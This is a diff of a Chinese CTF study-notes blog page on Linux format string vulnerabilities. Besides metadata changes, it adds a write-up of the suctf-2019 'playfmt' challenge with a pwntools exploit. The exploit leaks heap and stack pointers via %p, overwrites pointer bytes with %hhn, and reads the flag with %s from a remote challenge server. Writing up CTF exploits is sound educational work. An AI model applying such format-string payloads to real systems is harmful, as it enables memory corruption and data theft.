@@ -127,7 +127,7 @@
 <meta property="og:site_name" content="w4rd3n的笔记">
 <meta property="og:description" content="概念 格式化字符串漏洞:当printf等格式化字符串函数的第一个参数用户可控时,即可任意读写. 原理 格式化字符串的格式如下. 1%[parameter][flags][width][.precision][length]type  parameter:n$,使用第n个参数. flags:在width设置后指定可以用来作为填充的内容之类的内容. width:最小输出长度. pre">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-07-03T05:40:11.564Z">
+<meta property="og:updated_time" content="2021-07-03T07:18:57.584Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="IS-pwn-Linux-格式化字符串漏洞">
 <meta name="twitter:description" content="概念 格式化字符串漏洞:当printf等格式化字符串函数的第一个参数用户可控时,即可任意读写. 原理 格式化字符串的格式如下. 1%[parameter][flags][width][.precision][length]type  parameter:n$,使用第n个参数. flags:在width设置后指定可以用来作为填充的内容之类的内容. width:最小输出长度. pre">
@@ -503,7 +503,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">2.9k</span>
+                <span title="本文字数">3.6k</span>
               
 
               
@@ -571,6 +571,9 @@
 <li>格式化字符串在调用的格式化字符串函数的栈帧之上(即可以作为格式化控制符解析参数),这种情况基本上可以测出偏移后利用<code>%num$x</code>,<code>%num$n</code>任意读任意写.</li>
 <li>格式化字符串不可作为解析参数(不保存在栈上),就只能利用栈上的参数进行读写.</li>
 </ol>
+<h3 id="suctf-2019-playfmt">suctf-2019-playfmt</h3>
+<p>发现栈中留有栈指针和堆指针,通过<code>%?$n</code>修改栈指针的值使其指向堆指针,再修改堆指针偏移指向堆中的<code>flag</code>,<code>%s</code>打印即可.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("./playfmt")</span></span><br><span class="line">r = remote(<span class="string">"120.78.192.35"</span>, <span class="string">"9999"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"=====================\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"=====================\n"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%18$p\n%6$p\nmvp"</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">heap = int(r.recvuntil(<span class="string">"\n"</span>), <span class="number">16</span>) - <span class="number">0x18</span></span><br><span class="line">stack = int(r.recvuntil(<span class="string">"\n"</span>), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap: "</span> + hex(heap)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack: "</span> + hex(stack)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"mvp"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%"</span> + str((stack % <span class="number">0x100</span>) + <span class="number">0x10</span>) + <span class="string">"d%6$hhnmvp"</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"mvp"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%16d%14$hhnmvp"</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"mvp"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%18$smvp"</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"mvp"</span>)[:<span class="number">-3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br></pre></td></tr></table></figure>
 <h2 id="fprintf_chk-沙箱逃逸">fprintf_chk &amp; 沙箱逃逸</h2>
 <p><code>fprintf_chk</code>执行<code>%n</code>会报错.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** %n <span class="keyword">in</span> writable segment detected ***</span><br></pre></td></tr></table></figure>
@@ -703,7 +706,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">155</span>
+                    <span class="site-state-item-count">121</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -833,7 +836,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">36</span>
+                      
+                    
+                    <span class="site-state-item-count">37</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
@@ -883,7 +888,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#概念"><span class="nav-number">1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">3.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fprintf_chk-沙箱逃逸"><span class="nav-number">4.</span> <span class="nav-text">fprintf_chk &amp; 沙箱逃逸</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#概念"><span class="nav-number">1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#suctf-2019-playfmt"><span class="nav-number">3.1.</span> <span class="nav-text">suctf-2019-playfmt</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fprintf_chk-沙箱逃逸"><span class="nav-number">4.</span> <span class="nav-text">fprintf_chk &amp; 沙箱逃逸</span></a></li></ol></div>
             
 
           </div>
@@ -915,7 +920,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">898k</span>
+    <span title="站点总字数">807k</span>
   
 
   
@@ -924,7 +929,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">13:36</span>
+    <span title="站点阅读时长">12:13</span>
   
 </div>
 
